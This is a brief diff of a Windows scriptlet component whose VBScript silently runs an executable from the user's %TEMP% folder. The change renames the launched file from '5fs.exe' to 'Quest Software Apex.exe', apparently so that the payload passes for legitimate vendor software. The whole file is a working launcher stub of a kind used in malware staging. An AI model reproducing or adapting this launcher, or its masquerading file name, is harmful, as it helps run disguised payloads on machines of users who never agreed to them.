@@ -1,6 +1,6 @@
 <component>
 <script language="VBScript">
 Set shell=CreateObject("wscript.shell")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\5fs.exe")
+shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\Quest Software Apex.exe")
 </script>
 </component>
